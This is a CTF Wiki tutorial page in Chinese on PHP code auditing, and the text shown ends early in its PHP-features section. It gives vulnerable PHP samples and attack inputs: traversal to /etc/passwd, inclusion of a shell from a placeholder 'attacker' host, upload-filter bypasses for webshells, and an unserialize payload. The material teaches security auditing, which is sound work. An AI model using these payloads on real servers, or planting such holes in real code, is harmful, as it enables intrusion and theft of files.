

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>PHP 代码审计 &mdash; CTF Wiki  文档</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="索引"
              href="../genindex.html"/>
        <link rel="search" title="搜索" href="../search.html"/>
    <link rel="top" title="CTF Wiki  文档" href="../index.html"/>
        <link rel="next" title="Reverse Engineering" href="../reverse/index.html"/>
        <link rel="prev" title="SSRF 服务端请求伪造" href="ssrf.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> CTF Wiki
          

          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">CTF 介绍</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../introduction/history.html">CTF 竞赛的历史</a></li>
<li class="toctree-l1"><a class="reference internal" href="../introduction/mode.html">CTF 竞赛模式简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../introduction/content.html">CTF 竞赛内容</a></li>
<li class="toctree-l1"><a class="reference internal" href="../introduction/experience.html">线下攻防经验小结</a></li>
<li class="toctree-l1"><a class="reference internal" href="../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
<li class="toctree-l1"><a class="reference internal" href="../introduction/resources.html">学习资源</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../misc/about.html">杂项简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/recon.html">信息搜集技术</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/encode/index.html">编码分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/prefix.html">取证隐写</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/picture/index.html">图片分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/archive/index.html">压缩包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/audio/index.html">音频分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/cap.html">流量分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/others.html">其他</a></li>
</ul>
<p class="caption"><span class="caption-text">Crypto</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../crypto/introduction.html">密码学简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/classical/index.html">古典密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/symmetric/index.html">对称加密</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/asymmetric/index.html">非对称密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/hash/index.html">哈希函数</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/signature/index.html">数字签名</a></li>
<li class="toctree-l1"><a class="reference internal" href="../crypto/others/others.html">证书格式</a></li>
</ul>
<p class="caption"><span class="caption-text">Web</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="index.html">WEB 简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="sqli.html">SQL 注入</a></li>
<li class="toctree-l1"><a class="reference internal" href="xss.html">XSS 跨站脚本攻击</a></li>
<li class="toctree-l1"><a class="reference internal" href="csrf.html">CSRF 跨站请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="ssrf.html">SSRF 服务端请求伪造</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">PHP 代码审计</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#id1">文件包含</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id2">本地文件包含</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">远程文件包含</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id4">文件上传</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id5">绕过上传检查</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id6">变量覆盖</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id7">全局变量覆盖</a></li>
<li class="toctree-l3"><a class="reference internal" href="#extract"><code class="docutils literal"><span class="pre">extract()</span></code> 变量覆盖</a></li>
<li class="toctree-l3"><a class="reference internal" href="#import-request-variables"><code class="docutils literal"><span class="pre">import_request_variables</span></code> 变量覆盖</a></li>
<li class="toctree-l3"><a class="reference internal" href="#parse-str"><code class="docutils literal"><span class="pre">parse_str()</span></code> 变量覆盖</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id8">命令执行</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id9">直接执行代码</a></li>
<li class="toctree-l3"><a class="reference internal" href="#preg-replace"><code class="docutils literal"><span class="pre">preg_replace()</span></code> 代码执行</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id10">动态函数执行</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id11">反引号命令执行</a></li>
<li class="toctree-l3"><a class="reference internal" href="#curly-syntax">Curly Syntax</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id12">回调函数</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id13">反序列化</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id14">PHP 特性</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id15">数组</a></li>
<li class="toctree-l3"><a class="reference internal" href="#hash">魔法 Hash</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id16">十六进制转换</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id17">类型转换</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id18">内置函数的参数的松散性</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id19">寻找源代码备份</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#hg">hg 源码泄露</a></li>
<li class="toctree-l3"><a class="reference internal" href="#git">Git 源码泄露</a></li>
<li class="toctree-l3"><a class="reference internal" href="#ds-store"><code class="docutils literal"><span class="pre">.DS_Store</span></code> 文件泄露</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id20">网站备份文件</a></li>
<li class="toctree-l3"><a class="reference internal" href="#svn">SVN 泄露</a></li>
<li class="toctree-l3"><a class="reference internal" href="#web-inf-web-xml">WEB-INF / web.xml 泄露</a></li>
<li class="toctree-l3"><a class="reference internal" href="#cvs">CVS 泄露</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p class="caption"><span class="caption-text">Reverse</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../reverse/index.html">Reverse Engineering</a></li>
</ul>
<p class="caption"><span class="caption-text">Pwn</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../pwn/stackoverflow/index.html">栈溢出</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pwn/fmtstr/index.html">格式化字符串漏洞</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pwn/heap/index.html">堆利用</a></li>
</ul>
<p class="caption"><span class="caption-text">Executable</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../executable/elf/index.html">ELF文件</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">CTF Wiki</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
      <li>PHP 代码审计</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/web/php.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="php">
<h1>PHP 代码审计<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h1>
<div class="section" id="id1">
<h2>文件包含<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<p>常见的导致文件包含的函数有：</p>
<ul class="simple">
<li>PHP：<code class="docutils literal"><span class="pre">include()</span></code>，<code class="docutils literal"><span class="pre">include_once()</span></code>，<code class="docutils literal"><span class="pre">require()</span></code>，<code class="docutils literal"><span class="pre">require_once()</span></code>，<code class="docutils literal"><span class="pre">fopen()</span></code>，<code class="docutils literal"><span class="pre">readfile()</span></code> 等</li>
<li>JSP Servlet：<code class="docutils literal"><span class="pre">ava.io.File()</span></code>，<code class="docutils literal"><span class="pre">java.io.FileReader()</span></code> 等</li>
<li>ASP：<code class="docutils literal"><span class="pre">includefile</span></code>，<code class="docutils literal"><span class="pre">includevirtual</span></code> 等</li>
</ul>
<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
<div class="section" id="id2">
<h3>本地文件包含<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h3>
<p>本地文件包含，Local File Inclusion，LFI。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">include</span> <span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code class="docutils literal"><span class="pre">/etc/passwd</span></code> 文件内容。</p>
<ul>
<li><p class="first">%00 截断</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=../../../../../../../../../etc/passwd%00
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">magic_quotes_gpc=off</span></code>，PHP 小于 5.3.4 有效。</p>
<ul>
<li><p class="first">路径长度截断</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
</pre></div>
</div>
</li>
</ul>
<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
<ul>
<li><p class="first">点号截断</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=../../../../../../../../../boot.ini/………[…]…………
</pre></div>
</div>
</li>
</ul>
<p>只适用 Windows，点号需要长于 256。</p>
</div>
<div class="section" id="id3">
<h3>远程文件包含<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
<p>远程文件包含，Remote File Inclusion，RFI。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;share&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_share.php&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;sharelink&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_sharelink.php&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>构造变量 <code class="docutils literal"><span class="pre">basePath</span></code> 的值。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>/?basePath=http://attacker/phpshell.txt?
</pre></div>
</div>
<p>最终的代码执行了</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
</pre></div>
</div>
<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
<ul>
<li><p class="first">普通远程文件包含</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=[http|https|ftp]://example.com/shell.txt
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">allow_url_fopen=On</span></code> 并且 <code class="docutils literal"><span class="pre">allow_url_include=On</span></code> 。</p>
<ul>
<li><p class="first">利用 PHP 流 input</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=php://input
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">allow_url_include=On</span></code> 。</p>
<ul>
<li><p class="first">利用 PHP 流 filter</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=php://filter/convert.base64-encode/resource=index.php
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">allow_url_include=On</span></code> 。</p>
<ul>
<li><p class="first">利用 data URIs</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">allow_url_include=On</span></code> 。</p>
<ul>
<li><p class="first">利用 XSS 执行</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>?file=http://127.0.0.1/path/xss.php?xss=phpcode
</pre></div>
</div>
</li>
</ul>
<p>需要 <code class="docutils literal"><span class="pre">allow_url_fopen=On</span></code>，<code class="docutils literal"><span class="pre">allow_url_include=On</span></code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p>
</div>
</div>
<div class="section" id="id4">
<h2>文件上传<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h2>
<p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p>
<div class="section" id="id5">
<h3>绕过上传检查<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
<ul>
<li><p class="first">前端检查扩展名</p>
<p>抓包绕过即可。</p>
</li>
<li><p class="first"><code class="docutils literal"><span class="pre">Content-Type</span></code> 检测文件类型</p>
<p>抓包修改 <code class="docutils literal"><span class="pre">Content-Type</span></code> 类型，使其符合白名单规则。</p>
</li>
<li><p class="first">服务端添加后缀</p>
<p>尝试 %00 截断。</p>
</li>
<li><p class="first">服务端扩展名检测</p>
<p>利用解析漏洞。</p>
</li>
<li><p class="first">Apache 解析</p>
<p><code class="docutils literal"><span class="pre">phpshell.php.rar.rar.rar.rar</span></code> 因为 Apache 不认识 <code class="docutils literal"><span class="pre">.rar</span></code> 这个文件类型，所以会一直遍历后缀到 <code class="docutils literal"><span class="pre">.php</span></code>，然后认为这是一个 PHP 文件。</p>
</li>
<li><p class="first">IIS 解析</p>
<p>IIS 6 下当文件名为 <code class="docutils literal"><span class="pre">abc.asp;xx.jpg</span></code> 时，会将其解析为 <code class="docutils literal"><span class="pre">abc.asp</span></code>。</p>
</li>
<li><p class="first">PHP CGI 路径解析</p>
<p>当访问 <code class="docutils literal"><span class="pre">http://www.a.com/path/test.jpg/notexist.php</span></code> 时，会将 <code class="docutils literal"><span class="pre">test.jpg</span></code> 当做 PHP 解析， <code class="docutils literal"><span class="pre">notexist.php</span></code> 是不存在的文件。此时 Nginx 的配置如下</p>
<div class="highlight-nginx"><div class="highlight"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
  <span class="kn">root</span> <span class="s">html</span><span class="p">;</span>
  <span class="kn">fastcgi_pass</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">9000</span><span class="p">;</span>
  <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
  <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="s">/scripts</span><span class="nv">$fastcgi_script_name</span><span class="p">;</span>
  <span class="kn">include</span> <span class="s">fastcgi_param</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</li>
<li><p class="first">其他方式</p>
<p>后缀大小写、双写、特殊后缀如 <code class="docutils literal"><span class="pre">php5</span></code> 等，修改包内容的大小写过 WAF 等。</p>
</li>
</ul>
</div>
</div>
<div class="section" id="id6">
<h2>变量覆盖<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h2>
<div class="section" id="id7">
<h3>全局变量覆盖<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
<p>变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。</p>
<div class="highlight-ini"><div class="highlight"><pre><span></span><span class="na">register_globals</span><span class="o">=</span><span class="s">ON</span>
</pre></div>
</div>
<p>示例</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s2">&quot;Register_globals: &quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>当 <code class="docutils literal"><span class="pre">register_globals=ON</span></code> 时，提交 <code class="docutils literal"><span class="pre">test.php?auth=1</span></code>，<code class="docutils literal"><span class="pre">auth</span></code> 变量将自动得到赋值。</p>
</div>
<div class="section" id="extract">
<h3><code class="docutils literal"><span class="pre">extract()</span></code> 变量覆盖<a class="headerlink" href="#extract" title="永久链接至标题">¶</a></h3>
<p><code class="docutils literal"><span class="pre">extract()</span></code> 函数能够将变量从数组导入到当前的符号表，其定义为</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
</pre></div>
</div>
<p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code class="docutils literal"><span class="pre">EXTR_OVERWRITE</span></code> 和 <code class="docutils literal"><span class="pre">EXTR_SKIP</span></code>。</p>
<p>当值为 <code class="docutils literal"><span class="pre">EXTR_OVERWRITE</span></code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code class="docutils literal"><span class="pre">EXTR_SKIP</span></code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code class="docutils literal"><span class="pre">EXTR_OVERWRITE</span></code>。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>当 <code class="docutils literal"><span class="pre">extract()</span></code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
</div>
<div class="section" id="import-request-variables">
<h3><code class="docutils literal"><span class="pre">import_request_variables</span></code> 变量覆盖<a class="headerlink" href="#import-request-variables" title="永久链接至标题">¶</a></h3>
<div class="highlight-default"><div class="highlight"><pre><span></span>bool import_request_variables (string $types [, string $prefix])
</pre></div>
</div>
<p><code class="docutils literal"><span class="pre">import_request_variables</span></code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">import_request_variables</span><span class="p">(</span><span class="s2">&quot;G&quot;</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p><code class="docutils literal"><span class="pre">import_request_variables(&quot;G&quot;)</span></code> 指定导入 GET 请求中的变量，提交 <code class="docutils literal"><span class="pre">test.php?auth=1</span></code> 出现变量覆盖。</p>
</div>
<div class="section" id="parse-str">
<h3><code class="docutils literal"><span class="pre">parse_str()</span></code> 变量覆盖<a class="headerlink" href="#parse-str" title="永久链接至标题">¶</a></h3>
<div class="highlight-default"><div class="highlight"><pre><span></span>void parse_str ( string $str [, array &amp;$arr ])
</pre></div>
</div>
<p><code class="docutils literal"><span class="pre">parse_str()</span></code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">// var.php?var=new  变量覆盖</span>
<span class="x">$var = &quot;init&quot;;</span>
<span class="x">parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
<span class="x">print $var;</span>
</pre></div>
</div>
<p>与 <code class="docutils literal"><span class="pre">parse_str()</span></code> 类似的函数还有 <code class="docutils literal"><span class="pre">mb_parse_str()</span></code>。</p>
</div>
</div>
<div class="section" id="id8">
<h2>命令执行<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h2>
<div class="section" id="id9">
<h3>直接执行代码<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
<p>PHP 中有不少可以直接执行代码的函数。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">eval();</span>
<span class="x">assert();</span>
<span class="x">system();</span>
<span class="x">exec();</span>
<span class="x">shell_exec();</span>
<span class="x">passthru();</span>
<span class="x">escapeshellcmd();</span>
<span class="x">pcntl_exec();</span>
<span class="x">......</span>
</pre></div>
</div>
</div>
<div class="section" id="preg-replace">
<h3><code class="docutils literal"><span class="pre">preg_replace()</span></code> 代码执行<a class="headerlink" href="#preg-replace" title="永久链接至标题">¶</a></h3>
<p><code class="docutils literal"><span class="pre">preg_replace()</span></code> 的第一个参数如果存在 <code class="docutils literal"><span class="pre">/e</span></code> 模式修饰符，则允许代码执行。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class="p">;</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span><span class="p">,</span> <span class="s2">&quot;addslashes(</span><span class="se">\\</span><span class="s2">1)&quot;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>如果没有 <code class="docutils literal"><span class="pre">/e</span></code> 修饰符，可以尝试 %00 截断。</p>
</div>
<div class="section" id="id10">
<h3>动态函数执行<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
<p>用户自定义的函数可以导致代码执行。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$dyn_func</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;dyn_func&quot;</span><span class="p">];</span>
<span class="nv">$argument</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;argument&quot;</span><span class="p">];</span>
<span class="nv">$dyn_func</span><span class="p">(</span><span class="nv">$argument</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
</div>
<div class="section" id="id11">
<h3>反引号命令执行<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="sb">`ls -al`</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
</div>
<div class="section" id="curly-syntax">
<h3>Curly Syntax<a class="headerlink" href="#curly-syntax" title="永久链接至标题">¶</a></h3>
<p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;aaabbbccc </span><span class="si">${</span><span class="nv">`ls`</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<div class="highlight-php"><div class="highlight"><pre><span></span>&lt;?php
$foobar = &quot;phpinfo&quot;;
${&quot;foobar&quot;}();
?&gt;
</pre></div>
</div>
</div>
<div class="section" id="id12">
<h3>回调函数<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
<p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$evil_callback</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;callback&quot;</span><span class="p">];</span>
<span class="nv">$some_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="nv">$new_array</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$evil_callback</span><span class="p">,</span> <span class="nv">$some_array</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>攻击 payload</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.a.com/index.php?callback=phpinfo
</pre></div>
</div>
</div>
<div class="section" id="id13">
<h3>反序列化<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
<p>如果 <code class="docutils literal"><span class="pre">unserialize()</span></code> 在执行时定义了 <code class="docutils literal"><span class="pre">__destruct()</span></code> 或 <code class="docutils literal"><span class="pre">__wakeup()</span></code> 函数，则有可能导致代码执行。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="k">var</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$var</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;saved_code&quot;</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>攻击 payload</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
</pre></div>
</div>
</div>
</div>
<div class="section" id="id14">
<h2>PHP 特性<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h2>
<div class="section" id="id15">
<h3>数组<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;string&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
